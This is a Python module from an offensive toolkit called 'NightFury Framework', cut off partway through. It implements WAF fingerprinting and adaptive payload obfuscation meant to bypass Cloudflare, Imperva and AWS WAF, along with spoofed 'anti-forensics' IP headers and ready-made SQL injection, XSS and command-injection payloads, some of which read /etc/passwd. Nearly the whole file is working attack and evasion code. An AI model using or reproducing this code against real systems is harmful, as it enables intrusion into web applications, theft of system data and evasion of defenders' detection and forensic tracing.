"""
NightFury Framework - Advanced Evasion Engine
Polymorphic payloads, ML-based WAF bypass, anti-forensics
"""

import random
import string
import base64
import hashlib
import time
import re
from typing import List, Dict, Optional, Tuple
from datetime import datetime
import logging

logger = logging.getLogger(__name__)


class AdvancedEvasionEngine:
    """
    Advanced evasion techniques for bypassing security controls.
    Includes polymorphic payload generation, WAF fingerprinting, and anti-forensics.
    """
    
    def __init__(self):
        self.waf_signatures = self._load_waf_signatures()
        self.obfuscation_techniques = [
            'base64', 'hex', 'unicode', 'url_encoding', 
            'double_encoding', 'mixed_case', 'comment_injection',
            'null_byte', 'concatenation', 'character_substitution'
        ]
        self.polymorphic_cache = {}
        
    def _load_waf_signatures(self) -> Dict[str, List[str]]:
        """Load known WAF signatures for fingerprinting and bypass."""
        return {
            'cloudflare': [
                'cf-ray', '__cfduid', 'cloudflare', 'cf-cache-status'
            ],
            'akamai': [
                'akamai', 'akamai-origin-hop', 'akamaighost'
            ],
            'aws_waf': [
                'x-amzn-requestid', 'x-amz-cf-id', 'awselb'
            ],
            'imperva': [
                'incap_ses', 'visid_incap', 'imperva'
            ],
            'f5': [
                'bigipserver', 'f5-trace-id', 'x-wa-info'
            ],
            'sucuri': [
                'x-sucuri-id', 'x-sucuri-cache', 'sucuri'
            ],
            'wordfence': [
                'wordfence', 'wfvt_', 'wf-blocked'
            ]
        }
    
    def fingerprint_waf(self, headers: Dict[str, str]) -> Optional[str]:
        """
        Fingerprint the WAF based on response headers.
        
        Args:
            headers: HTTP response headers
            
        Returns:
            Detected WAF name or None
        """
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        
        for waf_name, signatures in self.waf_signatures.items():
            for signature in signatures:
                for header_key, header_value in headers_lower.items():
                    if signature.lower() in header_key or signature.lower() in header_value:
                        logger.info(f"[EVASION] Detected WAF: {waf_name}")
                        return waf_name
        
        logger.info("[EVASION] No known WAF detected")
        return None
    
    def generate_polymorphic_payload(self, base_payload: str, technique: str = 'auto') -> str:
        """
        Generate polymorphic version of payload to evade signature detection.
        
        Args:
            base_payload: Original payload
            technique: Obfuscation technique to use
            
        Returns:
            Obfuscated payload
        """
        if technique == 'auto':
            technique = random.choice(self.obfuscation_techniques)
        
        logger.debug(f"[EVASION] Applying technique: {technique}")
        
        if technique == 'base64':
            return self._obfuscate_base64(base_payload)
        elif technique == 'hex':
            return self._obfuscate_hex(base_payload)
        elif technique == 'unicode':
            return self._obfuscate_unicode(base_payload)
        elif technique == 'url_encoding':
            return self._obfuscate_url_encoding(base_payload)
        elif technique == 'double_encoding':
            return self._obfuscate_double_encoding(base_payload)
        elif technique == 'mixed_case':
            return self._obfuscate_mixed_case(base_payload)
        elif technique == 'comment_injection':
            return self._obfuscate_comment_injection(base_payload)
        elif technique == 'null_byte':
            return self._obfuscate_null_byte(base_payload)
        elif technique == 'concatenation':
            return self._obfuscate_concatenation(base_payload)
        elif technique == 'character_substitution':
            return self._obfuscate_character_substitution(base_payload)
        else:
            return base_payload
    
    def _obfuscate_base64(self, payload: str) -> str:
        """Base64 encoding with execution wrapper."""
        encoded = base64.b64encode(payload.encode()).decode()
        return f"eval(atob('{encoded}'))"
    
    def _obfuscate_hex(self, payload: str) -> str:
        """Hex encoding with execution wrapper."""
        hex_encoded = ''.join([f'\\x{ord(c):02x}' for c in payload])
        return f"eval('{hex_encoded}')"
    
    def _obfuscate_unicode(self, payload: str) -> str:
        """Unicode encoding."""
        unicode_encoded = ''.join([f'\\u{ord(c):04x}' for c in payload])
        return unicode_encoded
    
    def _obfuscate_url_encoding(self, payload: str) -> str:
        """URL encoding."""
        return ''.join([f'%{ord(c):02x}' if c not in string.ascii_letters + string.digits else c for c in payload])
    
    def _obfuscate_double_encoding(self, payload: str) -> str:
        """Double URL encoding."""
        first_pass = self._obfuscate_url_encoding(payload)
        return self._obfuscate_url_encoding(first_pass)
    
    def _obfuscate_mixed_case(self, payload: str) -> str:
        """Random case mixing."""
        return ''.join([c.upper() if random.random() > 0.5 else c.lower() for c in payload])
    
    def _obfuscate_comment_injection(self, payload: str) -> str:
        """Inject comments to break signatures."""
        # SQL comment injection
        if 'SELECT' in payload.upper() or 'UNION' in payload.upper():
            return payload.replace(' ', '/**/').replace('SELECT', 'SEL/**/ECT').replace('UNION', 'UNI/**/ON')
        # XSS comment injection
        elif '<script>' in payload.lower():
            return payload.replace('<script>', '<scr/**/ipt>').replace('</script>', '</scr/**/ipt>')
        return payload
    
    def _obfuscate_null_byte(self, payload: str) -> str:
        """Insert null bytes."""
        return ''.join([c + '\x00' if random.random() > 0.7 else c for c in payload])
    
    def _obfuscate_concatenation(self, payload: str) -> str:
        """String concatenation obfuscation."""
        # JavaScript concatenation
        if 'alert' in payload.lower() or 'eval' in payload.lower():
            parts = [payload[i:i+3] for i in range(0, len(payload), 3)]
            return '+'.join([f"'{part}'" for part in parts])
        # SQL concatenation
        elif 'SELECT' in payload.upper():
            return payload.replace(' ', '+CHAR(32)+')
        return payload
    
    def _obfuscate_character_substitution(self, payload: str) -> str:
        """Character substitution for common patterns."""
        substitutions = {
            'a': ['а', '@', '4'],  # Cyrillic a, at sign, number 4
            'e': ['е', '3'],        # Cyrillic e, number 3
            'i': ['і', '1', '!'],   # Cyrillic i, number 1, exclamation
            'o': ['о', '0'],        # Cyrillic o, number 0
            's': ['ѕ', '$', '5'],   # Cyrillic s, dollar, number 5
        }
        
        result = []
        for char in payload:
            if char.lower() in substitutions and random.random() > 0.5:
                result.append(random.choice(substitutions[char.lower()]))
            else:
                result.append(char)
        return ''.join(result)
    
    def generate_traffic_pattern_randomization(self) -> Dict[str, any]:
        """
        Generate randomized traffic patterns to evade behavioral detection.
        
        Returns:
            Dictionary with randomized request parameters
        """
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)',
            'Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X)',
        ]
        
        return {
            'user_agent': random.choice(user_agents),
            'delay': random.uniform(0.5, 3.0),  # Random delay between requests
            'referer': self._generate_random_referer(),
            'accept_language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-CA,en;q=0.9']),
            'accept_encoding': 'gzip, deflate, br',
            'cache_control': random.choice(['no-cache', 'max-age=0', 'no-store']),
        }
    
    def _generate_random_referer(self) -> str:
        """Generate realistic random referer."""
        domains = ['google.com', 'bing.com', 'yahoo.com', 'duckduckgo.com']
        paths = ['/search', '/results', '/q']
        return f"https://www.{random.choice(domains)}{random.choice(paths)}"
    
    def apply_protocol_obfuscation(self, payload: str, protocol: str = 'http') -> str:
        """
        Apply protocol-level obfuscation.
        
        Args:
            payload: Original payload
            protocol: Protocol type (http, websocket, etc.)
            
        Returns:
            Obfuscated payload
        """
        if protocol == 'http':
            # HTTP parameter pollution
            return self._http_parameter_pollution(payload)
        elif protocol == 'websocket':
            # WebSocket frame fragmentation
            return self._websocket_fragmentation(payload)
        return payload
    
    def _http_parameter_pollution(self, payload: str) -> str:
        """HTTP Parameter Pollution technique."""
        # Add duplicate parameters with different values
        if '=' in payload:
            parts = payload.split('&')
            polluted = []
            for part in parts:
                polluted.append(part)
                if random.random() > 0.5:
                    key = part.split('=')[0]
                    polluted.append(f"{key}=dummy_{random.randint(1000, 9999)}")
            return '&'.join(polluted)
        return payload
    
    def _websocket_fragmentation(self, payload: str) -> List[str]:
        """Fragment WebSocket payload into multiple frames."""
        # Split payload into random-sized chunks
        chunks = []
        chunk_size = random.randint(5, 15)
        for i in range(0, len(payload), chunk_size):
            chunks.append(payload[i:i+chunk_size])
        return chunks
    
    def generate_anti_forensics_headers(self) -> Dict[str, str]:
        """
        Generate headers that complicate forensic analysis.
        
        Returns:
            Dictionary of anti-forensics headers
        """
        return {
            'X-Forwarded-For': self._generate_fake_ip_chain(),
            'X-Real-IP': self._generate_fake_ip(),
            'X-Originating-IP': self._generate_fake_ip(),
            'X-Client-IP': self._generate_fake_ip(),
            'X-Remote-IP': self._generate_fake_ip(),
            'X-Remote-Addr': self._generate_fake_ip(),
            'Via': f"1.1 proxy{random.randint(1, 100)}.example.com",
            'Forwarded': f"for={self._generate_fake_ip()};proto=https",
        }
    
    def _generate_fake_ip(self) -> str:
        """Generate fake IP address."""
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    def _generate_fake_ip_chain(self) -> str:
        """Generate fake IP chain for X-Forwarded-For."""
        chain_length = random.randint(2, 5)
        return ', '.join([self._generate_fake_ip() for _ in range(chain_length)])
    
    def adaptive_payload_mutation(self, payload: str, waf_type: Optional[str], 
                                   blocked: bool = False) -> str:
        """
        Adaptively mutate payload based on WAF type and previous results.
        
        Args:
            payload: Original payload
            waf_type: Detected WAF type
            blocked: Whether previous attempt was blocked
            
        Returns:
            Mutated payload
        """
        if not blocked:
            # If not blocked, use lighter obfuscation
            return self.generate_polymorphic_payload(payload, 'mixed_case')
        
        # If blocked, use aggressive obfuscation based on WAF type
        if waf_type == 'cloudflare':
            # Cloudflare-specific bypasses
            payload = self._obfuscate_comment_injection(payload)
            payload = self._obfuscate_character_substitution(payload)
        elif waf_type == 'imperva':
            # Imperva-specific bypasses
            payload = self._obfuscate_double_encoding(payload)
        elif waf_type == 'aws_waf':
            # AWS WAF-specific bypasses
            payload = self._obfuscate_unicode(payload)
        else:
            # Generic aggressive obfuscation
            payload = self.generate_polymorphic_payload(payload, 'double_encoding')
        
        logger.info(f"[EVASION] Applied adaptive mutation for {waf_type}")
        return payload
    
    def generate_jit_payload(self, payload_type: str, target_params: Dict) -> str:
        """
        Just-In-Time payload generation based on target characteristics.
        
        Args:
            payload_type: Type of payload (sqli, xss, rce, etc.)
            target_params: Target-specific parameters
            
        Returns:
            Generated payload
        """
        if payload_type == 'sqli':
            return self._generate_jit_sqli(target_params)
        elif payload_type == 'xss':
            return self._generate_jit_xss(target_params)
        elif payload_type == 'rce':
            return self._generate_jit_rce(target_params)
        elif payload_type == 'lfi':
            return self._generate_jit_lfi(target_params)
        return ""
    
    def _generate_jit_sqli(self, params: Dict) -> str:
        """Generate JIT SQL injection payload."""
        db_type = params.get('db_type', 'mysql')
        
        if db_type == 'mysql':
            payloads = [
                "' OR '1'='1' -- ",
                "' UNION SELECT NULL,NULL,NULL -- ",
                "' AND SLEEP(5) -- ",
                "' OR 1=1 LIMIT 1 -- "
            ]
        elif db_type == 'postgresql':
            payloads = [
                "' OR '1'='1' --",
                "' UNION SELECT NULL,NULL,NULL --",
                "'; SELECT pg_sleep(5) --"
            ]
        elif db_type == 'mssql':
            payloads = [
                "' OR '1'='1' --",
                "' UNION SELECT NULL,NULL,NULL --",
                "'; WAITFOR DELAY '00:00:05' --"
            ]
        else:
            payloads = ["' OR '1'='1' --"]
        
        return random.choice(payloads)
    
    def _generate_jit_xss(self, params: Dict) -> str:
        """Generate JIT XSS payload."""
        context = params.get('context', 'html')
        
        if context == 'html':
            payloads = [
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<iframe src=javascript:alert(1)>"
            ]
        elif context == 'attribute':
            payloads = [
                "' onmouseover='alert(1)",
                "\" autofocus onfocus=alert(1) x=\"",
                "' onclick='alert(1)"
            ]
        elif context == 'javascript':
            payloads = [
                "';alert(1);//",
                "\";alert(1);//",
                "'-alert(1)-'"
            ]
        else:
            payloads = ["<script>alert(1)</script>"]
        
        return random.choice(payloads)
    
    def _generate_jit_rce(self, params: Dict) -> str:
        """Generate JIT RCE payload."""
        os_type = params.get('os', 'linux')
        
        if os_type == 'linux':
            payloads = [
                "; cat /etc/passwd",
                "| whoami",
                "`id`",
                "$(cat /etc/passwd)"
            ]
        elif os_type == 'windows':
            payloads = [
                "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "| whoami",
                "& dir C:\\"
            ]
        else:
            payloads = ["; id"]
        
(Content truncated due to size limit. Use line ranges to read remaining content)